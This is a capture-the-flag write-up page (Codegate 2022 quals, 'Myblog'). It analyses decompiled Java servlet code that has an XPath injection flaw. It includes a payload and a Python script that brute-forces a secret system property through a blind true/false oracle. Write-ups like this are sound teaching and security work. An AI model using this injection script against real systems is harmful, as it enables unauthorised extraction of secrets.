@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Myblog | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Myblog" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/Codegate-2022-quals/web/myblog.html" />
+<meta property="og:url" content="https://org.anize.rs/Codegate-2022-quals/web/myblog.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Myblog" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Myblog","url":"https://org.anize.rs/Codegate-2022-quals/web/myblog.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="myblog">Myblog</h1>
+
+<p><strong>Author</strong>: jkr</p>
+
+<p><strong>Tags:</strong> web</p>
+
+<p><strong>Points:</strong> 884 (19 solves)</p>
+
+<p><strong>Description:</strong></p>
+
+<blockquote>
+  <p>I made a blog. Please check the security.</p>
+</blockquote>
+
+<p>myblog is a simple blog that allows registering a user as well as reading and writing blog posts that have a title and content. The complete application logic is in <code class="language-plaintext highlighter-rouge">blogServlet.class</code>. After decompilation we see the request routing and user/session handling. The only function that is standing out to be exploitable is <code class="language-plaintext highlighter-rouge">doReadArticle()</code> that gets called when viewing a blog post.</p>
+
+<pre><code class="language-java=">  private String[] doReadArticle(HttpServletRequest req) {
+    String id = (String)req.getSession().getAttribute("id");
+    String idx = req.getParameter("idx");
+    if ("null".equals(id) || idx == null)
+      return null; 
+    File userArticle = new File(this.tmpDir + "/article/", id + ".xml");
+    try {
+      InputSource is = new InputSource(new FileInputStream(userArticle));
+      Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(is);
+      XPath xpath = XPathFactory.newInstance().newXPath();
+      String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
+      String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
+      title = decBase64(title.trim());
+      content = decBase64(content.trim());
+      return new String[] { title, content };
+    } catch (Exception e) {
+      System.out.println(e.getMessage());
+      return null;
+    } 
+  }
+</code></pre>
+
+<p>As <code class="language-plaintext highlighter-rouge">idx</code> parameter is unfiltered and this parameter goes straight into an XPath evaluation we can inject into XPath. Given the flag being placed in <code class="language-plaintext highlighter-rouge">catalina.properties</code> of tomcat means that the flag will be available as a system property called <code class="language-plaintext highlighter-rouge">flag</code>. Lucky enough XPath allows to access a system property using <code class="language-plaintext highlighter-rouge">fn:system-property()</code> as documented in the <a href="https://www.w3schools.com/xml/func_systemproperty.asp">XSL function spec</a>.</p>
+
+<p>We can use the XPath injection to have an oracle (true/false) using an injected XPath. After creating a blog post containing the word <code class="language-plaintext highlighter-rouge">MARKER</code> in title and content we use following script to brute the flag content using the true/false oracle of the injection <code class="language-plaintext highlighter-rouge">1' and starts-with(system-property('flag'),'FLAGHERE') or '</code>:</p>
+
+<pre><code class="language-python=">#!/usr/bin/python
+import requests, string
+headers = {"Cookie":"JSESSIONID=42442D352EBC41CE4FE07B8C0B72820C"}
+chars = "abcdef0123456789}{"
+
+url = 'http://3.39.79.180/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27{0}%27)%20or%20%27'
+p = 'codegate2022{'
+while True:
+    print p
+    for x in chars:
+        r = requests.get(url.format(p+x), headers=headers, allow_redirects=False)
+        if "MARKER" in r.text:
+            p += x
+            break
+</code></pre>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
